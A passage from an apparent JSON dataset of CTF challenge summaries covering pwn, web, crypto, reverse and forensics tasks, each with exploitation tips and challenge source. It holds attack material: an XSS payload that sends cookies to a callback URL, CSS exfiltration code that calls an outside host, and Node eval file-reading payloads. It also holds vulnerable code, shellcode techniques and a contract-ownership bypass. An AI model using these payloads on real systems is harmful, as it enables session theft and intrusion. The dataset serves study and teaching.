\"BABAAAABAAABABAABABAAABBBAAAAABAABBAABAABAABAABBABABABBAABAAAABAABAABAAAAAAABBAAABBABBAABAAABBBAABAABAAAAAAABBAAAAABABBABABAAAABAABAAAAAABAAAABAABABABABBBAAABAAAAABABAABAABAAAABBAAAABBABAABAAABBBAABAAABABBBAABAABBABAAABAABBABABABBAABAAAABBBAABAABAAAAAABAABAAABABBABABBABABBAABAABAAABBBAABAAABABBAABAABAAABBAAABAAAAAAABBAAABAAAABBBAAAAABAAABBAABAABBABAAAABAABAAAAABBAABAAABABAABAAABAABBAABAABAAAAAABAAAAABBBAAABABBABABBABABBAAABBABBAABAAABBBAABAABAAAABABAAABAAABAAABAABAAAAAAAABABAABABAABAAABAAABAABABABBABBAAAAABBAAAAAAABAABBAABBAAABBBBAABABAABAAABBBAABAAAABABABABAAAAAAAABBAABAAABAAABAAAAABAABBAAABABAABAAABABBAAABABBABABABBAABAAABBABABBAAAABAAABBAAAABAAAABAAAAABBBAAABBAABAABBABAAABAAAAAAABABAABABABAABAAABBBAABAAAABABAAABAAAABAABBABABBAABAABAAABBBAABAABAAABAABAAAAABABAAAAAAAAABABBBBABBAAABABAAAAABAAAAABABBAABAABAAAABAAAB\"\ndecoded_message = bacon_cipher_decode(encoded_message)\nprint(decoded_message)\n```"
    },
    {
        "name": "twisty",
        "write_up": "dataset/raw/twisty.md",
        "type": "pwn",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 488,
        "max_score": 500,
        "difficulty": 0.976,
        "knowledge": [
            "When exploiting a stack-based buffer overflow in CTF challenges, it's crucial to identify how local variables are arranged on the stack. This knowledge allows for precise manipulation of variables, such as overwriting function return addresses or control variables, through crafted inputs that exceed the bounds of an intended buffer. For instance, overflowing a history buffer to manipulate an index variable that tracks the number of moves in a game. To facilitate this, understanding the size and layout of stack variables (e.g., `board`, `history`, `index`) in the target binary plays a critical role in crafting effective exploits.",
            "Leaking memory addresses to bypass ASLR (Address Space Layout Randomization) is another essential technique in modern exploitation, especially in CTF challenges. By carefully overwriting variables on the stack, such as an index that controls the display of a move history, attackers can force a program to reveal stack contents, including crucial addresses like the stack canary, base address, and `libc` address. This is achievable by manipulating the variable to read beyond its normal limit, turning it into an out-of-bounds read vulnerability. Once these addresses are leaked, they can be used to defeat ASLR, making it possible to execute a return-to-libc attack or other payload execution strategies effectively.\n\nSample payload for manipulating an index variable to leak memory addresses (simplified example, not directly from the write-up):\n```c\n// Assuming 'history' overflow to overwrite 'index' can lead to OOB read\nmemcpy(history + 2048, &new_index, sizeof(new_index)); // Overwrite 'index' variable to out-of-bounds value\n```"
        ],
        "key": "```c\n#include <stdint.h>\n#include <stdio.h>\n#include <string.h>\n\nvoid play_game() {\n    uint8_t board[0x10];\n    uint8_t history[2048];\n    uint32_t index = 0;\n    char move[4];\n\n    memset(board, 0, sizeof(board));\n    memset(history, 0, sizeof(history));\n\n    while (1) {\n        printf(\"Enter move: \");\n        scanf(\"%3s\", move);\n\n        if (strcmp(move, \"undo\") == 0) {\n            if (index > 0) {\n                index--;\n                // Undo the move\n            } else {\n                printf(\"No more moves to undo!\\n\");\n            }\n        } else {\n            // Add move to history\n            history[index] = move_to_nibble(move);\n            index++;\n        }\n\n        if (index >= 2048) {\n            printf(\"History buffer overflow!\\n\");\n            break;\n        }\n    }\n}\n\nuint8_t move_to_nibble(const char *move) {\n    if (strcmp(move, \"c0u\") == 0) return 0x00;\n    if (strcmp(move, \"c1u\") == 0) return 0x01;\n    if (strcmp(move, \"c2u\") == 0) return 0x02;\n    if (strcmp(move, \"c3u\") == 0) return 0x03;\n    if (strcmp(move, \"c0d\") == 0) return 0x04;\n    if (strcmp(move, \"c1d\") == 0) return 0x05;\n    if (strcmp(move, \"c2d\") == 0) return 0x06;\n    if (strcmp(move, \"c3d\") == 0) return 0x07;\n    if (strcmp(move, \"r0r\") == 0) return 0x08;\n    if (strcmp(move, \"r1r\") == 0) return 0x09;\n    if (strcmp(move, \"r2r\") == 0) return 0x0a;\n    if (strcmp(move, \"r3r\") == 0) return 0x0b;\n    if (strcmp(move, \"r0l\") == 0) return 0x0c;\n    if (strcmp(move, \"r1l\") == 0) return 0x0d;\n    if (strcmp(move, \"r2l\") == 0) return 0x0e;\n    if (strcmp(move, \"r3l\") == 0) return 0x0f;\n    return 0xff; // Invalid move\n}\n\nint main() {\n    play_game();\n    return 0;\n}\n```"
    },
    {
        "name": "Two's Compliment",
        "write_up": "dataset/raw/Two's Compliment.md",
        "type": "reverse",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 250,
        "max_score": 550,
        "difficulty": 0.45454545454545453,
        "knowledge": [
            "In binary exploitation challenges where the shellcode execution environment prohibits certain byte values (e.g., only even-numbered bytes are allowed), strategies such as writing a preliminary shellcode to modify subsequent bytes in memory can enable the use of restricted operations or values. This approach involves using allowed instructions to increment memory content to the desired byte value, essentially encoding the final payload within constraints. \nExample payload part: `mov al, 8; inc BYTE PTR ds:[rax];` modifies a byte in memory to include an initially restricted value by incrementing an even byte.",
            "When dealing with shellcode restrictions, using tools like disassemblers (e.g., GDB, pwntools) to experiment and identify which instructions or byte sequences are allowable within the constraints can guide the development of a compliant exploit payload. This process involves iteratively testing instruction translations into bytecode to ensure they meet the challenge's requirements, and then crafting shellcode that leverages only the permitted byte values.\nExample instruction validation: \n- Allowed instruction `asm('inc BYTE PTR ds:[rax];')` resulting in bytecode `\\xfe\\x00` for incrementing memory content pointed by `rax`."
        ],
        "key": "```c\nundefined8 main(void)\n\n{  \n int iVar1;  \n void *pvVar2;  \n ssize_t sVar3;  \n int shellcode_length;  \n  \n setvbuf(stdout,(char *)0x0,2,0);  \n setvbuf(stdin,(char *)0x0,2,0);  \n puts(\"What is your shellcode?\");  \n pvVar2 = mmap((void *)0x133713370000,0x1000,7,0x32,-1,0);  \n if (pvVar2 != (void *)0x133713370000) {  \n   puts(\"mmap failed\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(-1);  \n }  \n iVar1 = len;  \n if (len < 0) {  \n   iVar1 = len + 7;  \n }  \n                   /* I have 0x800 of input. That should be very sufficient */  \n sVar3 = read(0,(void *)((long)(iVar1 >> 3) * 8 + 0x133713370000),0x800);  \n shellcode_length = (int)sVar3;  \n if (*(char *)((long)shellcode_length + (long)len + 0x13371336ffff) == '\\n') {  \n   shellcode_length = shellcode_length + -1;  \n   *(undefined *)((long)len + (long)shellcode_length + 0x133713370000) = 0;  \n }  \n iVar1 = check((byte *)((long)len + 0x133713370000),shellcode_length + -1);  \n if (iVar1 != 0) {  \n   puts(\"Bad Character found\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(-1);  \n }  \n (*(code *)((long)len + 0x133713370000))();  \n return 0;  \n}  \n\nundefined8 check(byte *my_shellcode,int shellcode_length)\n\n{  \n long current_byte;  \n int i;  \n  \n i = shellcode_length;  \n do {  \n   if (i < 0) {  \n     return 0;  \n   }  \n   current_byte = (long)i;  \n   i = i + -1;  \n } while ((my_shellcode[current_byte] & 1) == 0);  \n return 1;  \n}  \n```"
    },
    {
        "name": "Tyrannosaurus Rex",
        "write_up": "dataset/raw/Tyrannosaurus Rex.md",
        "type": "crypto",
        "competition": [
            "HacktivityCon/2020",
            "https://ctftime.org/event/1101/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "In a challenge involving reversing custom encryption schemes, if the encryption process involves base64 conversion followed by XOR operations, one can decrypt the message by applying the XOR operation in reverse order, considering base64 encoded known substrings to deduce the initial or ending state required for decryption. Specifically, if the flag format is known (e.g., `flag{.*}`), one can use the base64 representation of the known part (e.g., `base64.b64encode(b'flag')`) to start the reverse XOR process based on the encryption logic provided. \n   - Example approach for decryption (Python code snippet): \n   ```python\n   import base64\n   import binascii\n   \n   def decrypt(ciphertext):\n       z = list(binascii.unhexlify(ciphertext))\n       e = b''\n       # Assuming the first base64 character of 'flag' is known from the encryption scheme\n       last_char_value = base64.b64encode(b'flag')[0] \n       for i in range(len(z)-1, -1, -1):\n           last_char_value ^= z[i]\n           e = chr(last_char_value).encode('utf-8') + e\n       return base64.b64decode(e)\n   ```",
            "The XOR operation's reversible property, where `A ^ B = C` implies both `A ^ C = B` and `B ^ C = A`, can be exploited in cryptographic challenges to decrypt messages if part of the plaintext is known or predictable, such as standard flag formats. This is especially useful in scenarios where the encryption and decryption keys or methods are not directly given but can be inferred from the context or structure of encrypted data.\n   - Example payload cannot be defined universally due to variation in contexts; however, the principle is to identify a known value (e.g., part of the plaintext) and reverse engineer the encryption by sequentially applying XOR operations with known or deduced parts of the ciphertext or intermediate encryption states."
        ],
        "key": "```python\ndef encrypt(flag):\n    e = base64.b64encode(flag)\n    z = []\n    for i in range(len(e)):\n        z.append(e[i] ^ e[(i + 1) % len(e)])\n    return binascii.hexlify(bytes(z))\n```"
    },
    {
        "name": "Ugliest Website",
        "write_up": "dataset/raw/Ugliest Website.md",
        "type": "pwn",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 474,
        "max_score": 500,
        "difficulty": 0.948,
        "knowledge": [
            "To exfiltrate data from a protected webpage where direct data extraction methods are blocked, consider employing CSS variables and keyframe animations. This approach uses CSS to construct conditional requests, where specific CSS properties (`background-image`, `border-image`, `list-style-image`) are loaded based on the presence of targeted substrings within the webpage's content. This method is useful in challenges that involve side-channel attacks via CSS to leak data based on conditional requests triggered by CSS selectors.\n   - Example payload snippet: \n     ```css\n     .sgn[value*=\"abc\"] { --p1: url(\"/path/to/trigger?abc\"); }\n     ```",
            "When dealing with browser limitations such as caching and frame dropping, optimize the exfiltration process by breaking down the secret into smaller segments (e.g., trigrams) and using several properties to request different images. This way, even if the browser caches the images or drops frames, the unique combination of these smaller segments can still reconstruct the secret. This technique is particularly effective for leaking data where the payload needs to bypass browser optimizations that could hinder the data exfiltration process.\n   - Example optimization: To prevent caching from interfering with data exfiltration, make each request unique by appending a query string, or by using different segments for each keyframe to ensure all required data is transmitted."
        ],
        "key": "```php\n<?php\nfunction getFrames($count, $offset)\n{\n\t$ret = \"\";\n\tfor($i = 0; $i < $count; $i++) {\n\t\t$a = $offset + 3 * $i;\n\t\t$b = $a + 1;\n\t\t$c = $b + 1;\n\t\t$r = $i / $count * 100;\n\n\t\t$ret .= sprintf(\"%0.2f%% {\", $r);\n\t\t$ret .= sprintf(\"background:var(--p%d); \",      $a);\n\t\t$ret .= sprintf(\"border-image:var(--p%d);\",     $b);\n\t\t$ret .= sprintf(\"list-style-image:var(--p%d);\", $c);\n\t\t$ret .= \"}\\n\";\n\t}\n\n\treturn $ret;\n}\n?>\n<?php for($i = 0; $i <= 0xFFF; $i++): ?>\n<?php $hex = sprintf(\"%03x\", $i); ?>\n.sgn[value*=\"<?=$hex?>\"]{--p<?=$i?>:url(\"https://xer.fr/a?<?=$hex?>\")}\n<?php endfor; ?>\n\n* {\n\tdisplay: block;\n\tmin-height: 50px;\n\tborder: 1px solid blue;\n\tanimation-duration: 29s;\n}\n.sgn { animation-name: a; }\n\n@keyframes a { <?=getFrames(0x560, 0)?> }\n```"
    },
    {
        "name": "umassdining",
        "write_up": "dataset/raw/umassdining.md",
        "type": "web",
        "competition": [
            "UMassCTF/2022",
            "https://ctftime.org/event/1561/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "To circumvent Content Security Policy (CSP) restrictions in scenarios where the CSP includes `'unsafe-eval'` but restricts other sources, consider exploiting the use of JavaScript's `setTimeout` function or similar functions that evaluate a string as JavaScript code. This approach allows for executing arbitrary JavaScript in environments where inline scripts or external scripts from non-whitelisted sources are blocked. Example payload structure for XSS exploitation under such a configuration could be:\n```\n<p id=\"debug\" data-iloveumass=\"'); [YOUR_PAYLOAD_HERE]; //\"><script src=/static/js/thing.js></script>\n```\nReplace `[YOUR_PAYLOAD_HERE]` with the actual JavaScript code intended for execution.",
            "When attempting to extract sensitive information such as cookies in environments with strict CSP rules, double encoding the payload can ensure that it remains correctly formatted after it undergoes decoding by the application or the targeted user's browser. This method is particularly useful in scenarios where the injection point involves parameters in a URL or HTML attributes. An XSS payload designed to leak an admin's cookie with double encoding might look as follows:\n```\nPOST /register\n\nemail=asd%40foo.com&essay=<p%2bid%253d\"debug\"%2b%2bdata-iloveumass%253d\"')%253b%2bwindow.location%2b%253d%2b'http%253a//YOUR_CALLBACK_URL/cookie%253d'%252bencodeURIComponent(btoa(document.cookie))%253b%2b//\">%2b<script%2bsrc%253d/static/js/thing.js></script>\n```\nReplace `YOUR_CALLBACK_URL` with the URL intended to receive the leaked cookie data."
        ],
        "key": "```javascript  \nvar iloveumass = document.getElementById(\"debug\").getAttribute(\"data-iloveumass\");  \nfunction say_something(words) {  \n   setTimeout(`console.log('${words}')`,500)  \n}  \ndocument.addEventListener(\"DOMContentLoaded\", function() {  \n   say_something(iloveumass)  \n});\n```"
    },
    {
        "name": "umemo",
        "write_up": "dataset/raw/umemo.md",
        "type": "reverse",
        "competition": [
            "SECCON/2023/Quals",
            "https://ctftime.org/event/2003/tasks/"
        ],
        "score": 205,
        "max_score": 500,
        "difficulty": 0.41,
        "knowledge": [
            "In challenges dealing with arbitrary read-write vulnerabilities, particularly in device driver code, exploiting an offset wraparound can grant access to restricted memory regions. This is feasible if the device's addressable range is limited, and arithmetic operations on the offset can cause it to overflow or underflow, thereby bypassing range checks. This can effectively turn a limited out-of-bound write or read into an arbitrary one, particularly if the software does not properly handle large offsets or wraparound conditions. In this scenario, triggering an overflow to access the first page of a memory-mapped region enables arbitrary read-write capabilities. \n   - Example manipulation: if `offset_max + 1` results in `0`, setting `offset = offset_max + desired_offset` can access a restricted area.",
            "When exploiting binary applications, dealing with TTY (teletypewriter) control characters can pose challenges for payloads containing non-printable characters. Utilizing partial overwrites combined with control characters like `VEOF` (`0x04`, Ctrl-D) to force payload transmission without undesirable side effects (\u201cflushing\u201d the input buffer without closing the stream) can be an effective strategy. This requires crafting payloads that avoid terminal control characters (`BAD_CHARS = b\"\\x03\\x04\\x0a\\x11\\x13\\x7f\"`) or using them advantageously inside the payload. Restarting the application until ASLR (Address Space Layout Randomization) provides an address without these characters or finding existing memory areas conducive to the payload can mitigate the restrictions imposed by TTY processing.\n   - Practical approach: Use partial overwrite techniques or control characters to manipulate memory contents indirectly or to force flush of data while avoiding application or TTY layer restrictions."
        ],
        "key": "```c\nif((offset = getint() + 0x1000) < 0x1000 || lseek(fd, offset, SEEK_SET) < 0){  \n    puts(\"Out of range\");  \n}\n```\n\n```c\nstruct exit_function_list  \n{  \n    struct exit_function_list *next;  \n    size_t idx;  \n    struct exit_function fns[32];  \n};  \n\nstruct exit_function  \n{  \n    long int flavor;  \n    union  \n    {  \n        void (*at) (void);  \n        struct  \n        {  \n            void (*fn) (int status, void *arg);  \n            void *arg;  \n        } on;  \n        struct  \n        {  \n            void (*fn) (void *arg, int status);  \n            void *arg;  \n            void *dso_handle;  \n        } cxa;  \n    } func;  \n};  \n```"
    },
    {
        "name": "UnbreakMyStart",
        "write_up": "dataset/raw/UnbreakMyStart.md",
        "type": "forensics",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 337,
        "max_score": 500,
        "difficulty": 0.674,
        "knowledge": [
            "When confronted with a corrupted archive that displays a mixed signature of formats in its hexadecimal dump (e.g., a `zip` header in an `xz` archive), determine the correct format's specifications and restore its original header. For an `xz` file, this includes replacing the incorrect header with the correct magic bytes `0xFD, \"7xXZ\", 0x00`, stream flags, and a CRC32 checksum that matches the footer's stream flags. \n   Example actions include calculating the CRC32 with command line tools (`printf \"\\x00\\x04\" | cksum -o 3 | cut -d \" \" -f 1`) and reconstructing the file header accordingly.",
            "When modifying binary files to fix corrupted headers, utilize tools like `dd` to trim the corrupted part and then `cat` combined with `printf` to prepend the correct header. This technique can restore access to the contained data when the corruption is isolated to the file's start. Specifically, for `xz` archives, after repairing the header, the file can be decompressed and extracted normally using `xz -d` and `tar` commands.\n   Example command sequence for fixing and extracting: \n   ```\n   dd if=corrupted_file.xz of=trimmed.bin bs=1 skip=11\n   (printf \"\\xFD7zXZ\\x00\\x00\\x04\"; cat trimmed.bin) > fixed.tar.xz\n   xz -d fixed.tar.xz\n   tar zxvf fixed.tar\n   ```"
        ],
        "key": "```python\ndef process_file(file_path):\n    with open(file_path, 'rb') as f:\n        data = f.read()\n\n    # Check if the file starts with the wrong header\n    if data.startswith(b'PK'):\n        # Replace the first 11 bytes with the correct xz header\n        fixed_data = b'\\xFD7zXZ\\x00\\x00\\x04' + data[11:]\n        \n        with open('fixed_file.xz', 'wb') as f:\n            f.write(fixed_data)\n\n# Example usage\nprocess_file('unbreak_my_start.tar.xz')\n```"
    },
    {
        "name": "Unionized",
        "write_up": "dataset/raw/Unionized.md",
        "type": "reverse",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 275,
        "max_score": 550,
        "difficulty": 0.5,
        "knowledge": [
            "In a scenario where a binary uses unions for different data types (e.g., string, integer), changing an object's type from string to a smaller data type (e.g., char) and back allows for writing or reading from arbitrary addresses. This technique leverages the behavior that if the new string size is less than the previously allocated size, the program uses the existing pointer, potentially leading to arbitrary read/write vulnerabilities.\n    - To demonstrate an arbitrary write, first create an object of type string with a certain length, then modify the object type to a char (or another smaller data type) and change it back to a string with a smaller size than initially allocated. This step prevents the allocation of new memory, manipulating the program to use the address contained in the smaller data type for subsequent operations.",
            "For heap-based vulnerabilities in the presence of ASLR (Address Space Layout Randomization), including PIE (Position Independent Executable) enabled binaries, obtaining a memory leak can enable further exploitation by revealing base addresses of loaded binaries or functions. This can lead to calculating the addresses of other functions or gadgets required for exploitation.\n    - An example payload to leak addresses from the heap could involve first manipulating an object to point to a function pointer or other predictable heap addresses, followed by an action (e.g., displaying the object) that triggers reading the manipulated address, thus leaking its contents over stdout. By calculating offsets from the leaked address to target functions (e.g., a 'win' function), you can manipulate function pointers to achieve arbitrary code execution.\n\nThese methods form the basis of exploiting union-based vulnerabilities and leveraging arbitrary reads/writes for bypassing security mechanisms like ASLR and PIE in CTF challenges or real-world applications."
        ],
        "key": "```c\nstruct created{  \n\tint type;  \n\tint size;\n\n\tunion Variable {  \n\t\tchar * string;  \n\t\tint integer;  \n\t\tlong long long_boi;  \n\t\tchar character;\n\n\t} variable;  \n\tvoid (*print)();  \n\tstruct created *next;  \n};  \n\nvoid create_variable(struct created *tmp) {\n    int size;\n    switch(tmp->type) {\n        case 1:  \n            while(1){  \n                printf(\"What size would you like your string to be\\n\");  \n                scanf(\"%d\", &size);  \n                if(tmp->size < size)  \n                {  \n                    tmp->variable.string = malloc(size);  \n                    tmp->size = size;  \n                }  \n                if(!tmp->variable.string){  \n                    printf(\"Allocation failed Try again\\n\");  \n                    sleep(1);  \n                    continue;  \n                }  \n                break;  \n            }  \n            printf(\"What is your data\\n\");  \n            read(0, tmp->variable.string, tmp->size);  \n            tmp->type = 1;  \n            tmp->print = display_string;  \n            break;  \n        // Other cases...\n    }\n}\n\nvoid win(){  \n\tsystem(\"/bin/sh\");  \n}\n\nvoid delete(){  \n\tputs(\"Not implemented\");  \n\treturn;  \n}  \n```"
    },
    {
        "name": "universal",
        "write_up": "dataset/raw/universal.md",
        "type": "reverse",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 481,
        "max_score": 500,
        "difficulty": 0.962,
        "knowledge": [
            "When dealing with obfuscated quantum circuits that only utilize `H`, `T`, and `CNOT` gates, one can determine the function of the circuit by isolating the sequences of gates without `CNOT` gates. This is particularly useful in circuits based on the Quantum Fourier Transform (QFT) adder, where the addition operation is implemented with `Rz` rotations, which can be represented by sequences of `H` and `T` gates. This approach simplifies the analysis of quantum circuits by focusing only on the single-qubit gate sequences that enact rotations, enabling the extraction of the added number by reconstructing the rotation angles.",
            "For classical simulation of quantum circuits that would theoretically require infeasible computational resources (such as a statevector of size `2^256`), using quantum circuit simulators like Qiskit can be highly efficient. These simulators can emulate the circuit's behavior without explicitly constructing the full statevector, making it practical to simulate circuits with a large number of qubits on classical hardware with relatively low memory and processing requirements. This approach can be used to verify the results of quantum algorithms or to extract information from quantum circuits without needing quantum computational resources.\n    - Example payload for simulating and extracting information from a quantum circuit with Qiskit:\n    ```python\n    from qiskit import QuantumCircuit, Aer, execute\n    simulator = Aer.get_backend('aer_simulator')\n    qc = QuantumCircuit.from_qasm_file(\"converted_circuit.qasm\")\n    qc.measure(list(range(256)), list(range(256)))\n    job = execute(qc, simulator)\n    result = job.result()\n    print(result.get_counts())\n    ```"
        ],
        "key": "```python  \nfrom math import pi, log2  \nimport numpy as np\n\n# hadamard gate  \nH = 1/np.sqrt(2)*np.array([[1, 1],  \n                          [1,-1]], dtype=np.complex128)  \n# T-phase gate  \nT = np.array([[1, 0],  \n             [0, np.exp(1j * pi/4)]], dtype=np.complex128)  \n# identity operator  \nI = np.array([[1, 0],  \n             [0, 1]], dtype=np.complex128)\n\n########################################\n\n# num qubits  \nn = 256  \n# max error  \nepsilon = 1e-4\n\n\"\"\"  \nlook for the start/end of the QFT.  \nThis includes a few extra gates (from the QFT)  \nfor qubit 0 and 1, so we just ignore those  \n\"\"\"\n\nidcs = []  \nwith open(\"converted_circuit.qasm\", \"r\")  as f:  \n   for i,line in enumerate(f):  \n       if line == \"cx q[1],q[0];\\n\":  \n           idcs.append(i)  \n           # print(i)\n\ni0 = idcs[1]  \ni1 = idcs[2]\n\nlines = open(\"converted_circuit.qasm\", \"r\").readlines()  \nidcs = [i for i,line in enumerate(lines)]  \ngates = lines[i0 + 1:i1 - 1]\n\n########################################\n\nunitaries = [I for _ in range(n)]\n\nfor line in gates:  \n   instr = line[0]  \n   qubit = line[line.find(\"[\")+1:line.find(\"]\")]  \n   qubit = int(qubit)  \n  \n   i = qubit  \n   if instr == 't':  \n       unitaries[i] = unitaries[i] @ T  \n   elif instr == 'h':  \n       unitaries[i] = unitaries[i] @ H  \n   else:  \n       raise ValueError(\"invalid gate\")  \n\n# correct for QFT spillover  \nfor i in range(3):  \n   unitaries[i] = I\n\n########################################\n\nbinary_reprs = \"\"  \nunitaries = unitaries\n\nfor i,u in enumerate(unitaries):  \n   delta = np.abs(u) - I  \n   if np.max(np.abs(delta)) > epsilon:  \n       raise ValueError(\"unitary is not approximately a phase gate\")  \n  \n   u /= u[0][0]  \n   angle = np.angle(u[1][1])  \n  \n   b = str(int(angle < 0))  \n   binary_reprs += b\n\nflag = int(binary_reprs[::-1], 2).to_bytes(n//8, \"little\")  \n# first character is wrong b/c we included some extra QFT gates lol  \nflag = b\"d\" + flag[1:]  \nprint(flag)  \n```"
    },
    {
        "name": "UnknownOrigin",
        "write_up": "dataset/raw/UnknownOrigin.md",
        "type": "web",
        "competition": [
            "CyberSecurityRumble/2021",
            "https://ctftime.org/event/1429/tasks/"
        ],
        "score": 146,
        "max_score": 760,
        "difficulty": 0.19210526315789472,
        "knowledge": [
            "When interacting with smart contracts for ownership control, especially in challenges where the condition `msg.sender != tx.origin` is used as a security mechanism, one effective strategy is to deploy a secondary contract that interacts with the target contract. This is because `tx.origin` refers to the original caller of the transaction (typically the user\u2019s address) and cannot be a contract address, whereas `msg.sender` can be the address of a contract calling another contract. This method allows for the bypassing of ownership restrictions by ensuring that `msg.sender` and `tx.origin` are different, satisfying the condition set by the modifier.",
            "To modify the owner of a smart contract in a blockchain-based CTF challenge without directly satisfying contract conditions (like `onlyOwned` modifiers), consider creating and deploying a malicious contract that interacts with the target contract. The malicious contract should include a function that calls the ownership-changing function of the target contract. This way, the `msg.sender` in the context of the target contract becomes the address of the malicious contract, potentially bypassing security checks that compare `msg.sender` with `tx.origin`.\n   \n   Sample code snippet for the malicious contract:\n   ```solidity\n   // SPDX-License-Identifier: MIT\n   pragma solidity ^0.6.0;\n   \n   import \"./UnknownOrigin.sol\";\n   \n   contract AttackerOrigin {\n      UnknownOrigin public unknownOrigin = UnknownOrigin(YOUR_CHALLENGE_CONTRACT_ADDRESS);\n   \n      function attackOwner(address _owner) public {\n          unknownOrigin.updateOwner(_owner);\n      }\n   }\n   ```"
        ],
        "key": "```js  \n// SPDX-License-Identifier: MIT  \npragma solidity ^0.6.0;\n\ncontract UnknownOrigin {  \n   address public owner;\n\n   constructor() public {  \n         owner = msg.sender;  \n   }  \n  \n   modifier onlyOwned () {  \n         require(msg.sender != tx.origin);  \n         _;  \n   }\n\n   function updateOwner (address _newOwner) public onlyOwned {  \n         owner = _newOwner;  \n   }  \n}  \n```"
    },
    {
        "name": "Unnormalized-form Data",
        "write_up": "dataset/raw/Unnormalized-form Data.md",
        "type": "misc",
        "competition": [
            "Harekaze/2018",
            "https://ctftime.org/event/549/tasks/"
        ],
        "score": 127,
        "max_score": 350,
        "difficulty": 0.3628571428571429,
        "knowledge": [
            "When dealing with SQL challenges in CTFs that involve recursive relations and functions, modifying the provided SQL functions to adjust their parameters or the conditions within can help reveal hidden or obscured data segments, especially when conditions like `WHERE i = x` are involved. This is applicable in scenarios where the data relationship is complex and indirect, such as when data is stored in non-traditional formats or relations that are not easily readable without processing. \n\n    - Example modification: \n      ```sql\n      CREATE FUNCTION flag(idx integer) RETURNS text AS $$\n      ...\n      SELECT c FROM r, dic WHERE i = idx AND r.a::TEXT[] @> dic.a ORDER BY j) AS t$$;\n      ```",
            "In scenarios requiring analysis of data progression or transformation, iterating over a range of values (like sequence numbers or steps in a process) and observing the output can uncover patterns or results not visible with a static or default view. This technique is specifically valuable in CTF challenges that involve data encryption, compression, or complex transformations where the output depends on variable states.\n\n    - Example iteration script:\n      ```sh\n      for i in {0..40}; do \n        psql -U postgres -d unf -c \"SELECT FLAG($i)\" >> dump;\n      done;\n      ```"
        ],
        "key": "```sql  \nCREATE FUNCTION flag() RETURNS text  \n   LANGUAGE sql IMMUTABLE SECURITY DEFINER  \n   AS $$WITH RECURSIVE r(i, j, a) AS ( VALUES (  \n        0,1,'{a,B,4}'::TEXT[]), (0,2,'{d,B,7}'), (0,3,'{b,F,1}'),\n(0,4,'{b,D,7}'), (0,5,'{b,E,7}'),  \n        (0,6,'{a,E,3}'), (0,7,'{b,A,2}'), (0,8,'{d,F,2}'), (0,9,'{d,F,7}'),\n(0,10,'{a,A,4}'),  \n        0,11,'{b,H,7}'), (0,12,'{b,H,5}'), (0,13,'{a,E,6}'), (0,14,'{d,C,3}'),\n(0,15,'{d,E,5}'),  \n        (0,16,'{d,B,1}'), (0,17,'{c,A,5}'), (0,18,'{b,G,6}'),\n(0,19,'{d,E,7}'), (0,20,'{c,F,7}'),  \n        (0,21,'{c,B,2}'), (0,22,'{d,D,3}'), (0,23,'{c,A,1}'),\n(0,24,'{a,G,1}'), (0,25,'{c,G,7}'),  \n        (0,26,'{a,B,3}'), (0,27,'{a,C,5}'), (0,28,'{a,C,3}'), (0,29,'{d,C,6}')  \n        UNION    SELECT i + 1, j, d FROM r, rel WHERE i < 40 AND a::TEXT[] <@\ns  )  \n        SELECT string_agg(c, '') FROM  \n        (SELECT c FROM r, dic WHERE i = 40 AND r.a::TEXT[] @> dic.a ORDER BY\nj) AS t$$;\n```"
    },
    {
        "name": "Unsafereputation",
        "write_up": "dataset/raw/Unsafereputation.md",
        "type": "This challenge is a **web** type challenge.",
        "competition": [
            "Shakti/2021",
            "https://ctftime.org/event/1251/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When facing JavaScript-based web applications that utilize `eval()` for executing code dynamically, it's actionable to test for Remote Code Execution (RCE) vulnerabilities by bypassing blacklist filters. These filters commonly attempt to block dangerous functions or keywords. Bypassing can be achieved by using alternative code execution methods not covered by the blacklist, like leveraging the `require('fs')` to read or manipulate filesystem contents in a Node.js environment.  \nExample payload: `require('fs').readFileSync('filename').toString()`",
            "In scenarios where the direct method to read or find sensitive information, such as flag files, is obfuscated or the file's location is non-standard, one can resort to utilizing filesystem manipulation or listing capabilities to enumerate the directories and files on the server. This approach is especially useful when certain keywords or functions are blocked, and direct access to the flag is not possible.  \nExample payload: `require('fs').readdirSync('.').toString()`"
        ],
        "key": "```js  \nvar express = require('express');  \nvar app = express();\n\napp.get('/', function (req, res) {\n\n var inp = req.query.text;\n\n if(inp){  \n   const blacklist = ['system', 'child_process', 'exec', 'spawn', 'eval'];\n\n   if(blacklist.map(v=>inp.includes(v)).filter(v=>v).length !== 0){  \n     res.send(\"That function is blocked, sorry XD\");  \n     return;  \n   }\n\n   res.send('Welcome to the world ' + eval(inp));  \n   console.log(req.query.text);  \n }else{  \n   res.send(\"Hey aren't you missing something??\");  \n   return;  \n }  \n});\n\napp.listen(4000, function () {  \n console.log('app listening on port 4000!');  \n});  \n```"
    },
    {
        "name": "Unvreakable Vase",
        "write_up": "dataset/raw/Unvreakable Vase.md",
        "type": "crypto",
        "competition": [
            "NahamCon/2020",
            "https://ctftime.org/event/1067/tasks/"
        ],
        "score": 125,
        "max_score": 1000,
        "difficulty": 0.125,
        "knowledge": [
            "When dealing with ciphertext that may have undergone case manipulation, particularly with Base64 encoded strings where both uppercase and lowercase characters are significant for decoding, one can iteratively test all case permutations of the encoded string to recover the original message. This approach is especially useful when direct decoding yields non-meaningful results due to case sensitivity issues in the encoded data. Use Python's `base64.b64decode()` function combined with a function to modify the case of characters in the string according to binary representations of numbers to methodically test every possible case combination.",
